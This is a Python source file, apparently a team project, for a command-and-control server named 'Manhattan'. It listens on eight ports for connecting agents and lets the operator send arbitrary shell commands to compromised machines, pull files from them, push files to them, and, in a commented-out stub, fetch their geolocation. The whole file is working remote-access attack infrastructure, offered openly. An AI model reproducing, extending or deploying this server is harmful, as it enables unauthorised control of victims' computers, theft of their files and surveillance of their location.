import socket
import threading
import time
import sys
import queue
import os
import pyfiglet
import json

# Khayal Aliyev -> Write project name to dashboard in figlet
def figlet_text(text):
    ascii_art = pyfiglet.figlet_format(text)
    return ascii_art


# Dictionary to store active connections, with port numbers as keys
active_connections = {}
# Lock for thread safety when modifying active_connections
connection_lock = threading.Lock()
message_queue = queue.Queue()


# Huseyn Abdullayev -> Making user friendly dashboard 
def welcome_message():
    print("\n========================================================")

    example_text = "Manhattan"
    print(figlet_text(example_text))

    print("========================================================")
    print("This is your Command and Control server.")
    print("You can manage active sessions and interact with agents.")
    print("Type 'help' for a list of available commands.")
    print("Type 'exit' to quit the program.")
    print("========================================================\n")

# Huseyn Abdullayev -> Making user friendly dashboard 
def main_menu():
    print("\nActive Sessions:")
    for port in active_connections:
        print(f"Port: {port}")
    print("Enter 'exit' to quit the program and 'background' to background an active session.")
    print("Enter the session port number to interact with a session.")

# Mahmud Mammedtaghiyev -> Handling multiple connections via threading
def handle_connection(client_socket, port):
    client_socket.settimeout(10)  # Set a more reasonable timeout
    while True:
        try:
            # Initialize an empty response
            full_response = ""
            while True:
                # Receive data in chunks
                data = client_socket.recv(4096).decode()
                if not data:
                    break
                full_response += data

            if full_response:
                print(f"Received result from Agent {port}: {full_response}")
                message_queue.put(f"Received data on port {port}: {full_response}")
            else:
                raise ConnectionError(f"Connection on port {port} closed by client.")

        except socket.timeout:
            print(f"Timeout waiting for response from Agent {port}")
            break  # Break the loop if a timeout occurs

        except ConnectionError as ce:
            message_queue.put(ce)
            break


# Mahmud Mammedtaghiyev -> Timeout Error Handling 
def print_messages():
    while True:
        try:
            listening_message = message_queue.get(timeout=1)  # Set a timeout to avoid blocking indefinitely
            print(listening_message)
        except queue.Empty:
            break

# Garib Guluzada -> Downloading Files from agent device with Error Handling
def receive_file(client_socket, file_name, file_size):
    try:
        with open(file_name, 'wb') as file:
            bytes_received = 0
            while bytes_received < file_size:
                data = client_socket.recv(4096)
                if not data:
                    break
                file.write(data)
                bytes_received += len(data)

        # Send acknowledgment to the agent
        client_socket.send("ReceivedFile".encode('utf-8'))
        print(f"File '{file_name}' downloaded successfully.")
    except Exception as e:
        print(f"Error while receiving '{file_name}': {str(e)}")


exit_requested = False

# Garib Guluzada -> Starting a listener for agent connection
def start_listener(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(('0.0.0.0', port))
    listener.listen(5)
    message_queue.put(f"Listening on port {port}")

    while True:
        client_socket, client_address = listener.accept()
        message_queue.put(f"Connection on port {port} from {client_address}")

        # Assign a unique connection ID
        with connection_lock:
            active_connections[port] = client_socket

        # Start a thread to handle commands for this port
        client_thread = threading.Thread(target=handle_connection, args=(client_socket, port))
        client_thread.start()


# Define the ports you want to listen on
ports_to_listen = [7777, 8888, 9999, 6666, 5555, 4444, 3333, 2222]

if __name__ == "__main__":
    welcome_message()

    # Mahmud Mammedtaghiyev -> Create a separate thread for message printing
    print_thread = threading.Thread(target=print_messages)
    print_thread.daemon = True
    print_thread.start()

    # Start listeners for each port
    for port in ports_to_listen:
        listener_thread = threading.Thread(target=start_listener, args=(port,))
        listener_thread.start()

    time.sleep(1)
    print_messages()

    # Main menu loop for managing active ports
    while True:
        main_menu()
        choice = input("Enter a command: ")

        # Garib Guluzada -> Implementation of main commands such as upload, download, cd, dir, exit, list
        
        if choice == 'exit':
            sys.exit()

        if choice == 'list':
            # List active sessions
            for agent_id, agent_socket in active_connections.items():
                print(f"Session ID: {agent_id}")
            continue

        try:
            selected_agent_id = int(choice)
            if selected_agent_id in active_connections:
                print(f"Interacting with session ID {selected_agent_id}. Type 'exit' to return to the main menu.")
                agent_socket = active_connections[selected_agent_id]

                while True:
                    try:

                        command = input("Enter a command for the agent (or 'exit' to break the connection.): ")

                        if command.lower() == "exit":
                            agent_socket.send(command.encode('utf-8'))
                            exit_requested = True
                            active_connections.pop(int(choice))

                            break

                        elif command.lower() == "cls":
                            os.system("cls")

                        elif command.lower() == 'background':
                            os.system("cls")
                            break
                        
# Khayal Aliyev -> Not ready geo function that gives agent's geolocation. Working one is attached as geo_apart_test.py
                        
                        # elif command.lower() == 'geo':
                        #     try:
                        #         # Receive the length of the data first
                        #         data_length = int.from_bytes(agent_socket.recv(4), 'big')
                        #         location_data = agent_socket.recv(data_length).decode(
                        #             'utf-8')  # Receive the data based on its length
                        # 
                        #         if location_data:
                        #             location = json.loads(location_data)
                        #             print("Geolocation Information:")
                        #             print(json.dumps(location, indent=2))
                        #         else:
                        #             print("No geolocation data received from the agent.")
                        # 
                        #     except json.JSONDecodeError as e:
                        #         print(f"Error decoding JSON: {e}")
                        #     except Exception as e:
                        #         print(f"Error: {e}")
                        
                        # Garib Guluzada -> Download function - Error Handling
                        elif command.lower().startswith("download"):
                            agent_socket.send(command.encode('utf-8'))
                            file_name = command.split()[1]
                            file_size_str = agent_socket.recv(1024).decode('utf-8')

                            if not file_size_str.isdigit():
                                print(f"Invalid file size: {file_size_str}")
                                continue

                            file_size = int(file_size_str)
                            receive_file(agent_socket, file_name, file_size)
                            agent_socket.settimeout(5)
                            acknowledgment_received = False
                            try:
                                acknowledgment = agent_socket.recv(1024).decode('utf-8')
                                if acknowledgment == "ReadyForCommands":
                                    acknowledgment_received = True
                                else:
                                    print("Unexpected acknowledgment received.")
                            except socket.timeout:
                                print("Acknowledgment not received within the timeout.")
                            finally:
                                agent_socket.settimeout(None)

                            if not acknowledgment_received:
                                print("Resuming without acknowledgment.")

                        # Garib Guluzada -> Upload function - Error Handling
                        
                        elif command.lower().startswith("upload"):
                            file_path = command.split()[1]
                            try:
                                with open(file_path, 'rb') as file:
                                    file_data = file.read()
                                    file_size = len(file_data)

                                    # Send the command to the agent
                                    agent_socket.send(command.encode('utf-8'))

                                    # Send the file size to the agent (as big-endian bytes)
                                    agent_socket.sendall(file_size.to_bytes(8, 'big'))

                                    # Send the file data to the agent
                                    agent_socket.sendall(file_data)
                                    print(f"File '{file_path}' sent to the agent.")
                            except FileNotFoundError:
                                print(f"File not found: {file_path}")
                                agent_socket.send("FileNotFound".encode('utf-8'))
                        
                        # Mahmud Mammedtaghiyev -> Final Error Handling with timeout exceptions
                        
                        else:
                            agent_socket.send(command.encode('utf-8'))

                            while True:  # Loop to handle response until termination or timeout
                                agent_socket.settimeout(0.5)  # Set a timeout
                                try:
                                    response = agent_socket.recv(4096).decode('utf-8')
                                    if not response:
                                        print("Agent Response: No more data")
                                        break  # Break loop if response ends
                                    print("Agent Response:")
                                    print(response)
                                except socket.timeout:
                                    print("Agent Response: No response received within the timeout.")
                                    break  # Break loop on timeout
                                except ConnectionError as ce:
                                    print(f"Agent Response: Connection closed by the agent.")
                                    break  # Break loop on connection closure
                    except Exception as e:
                        print(e)
                        active_connections.pop(int(choice))
                        break
            else:
                print("Invalid session ID. Try again.")
        except ValueError:
            print("Invalid input. Try again.")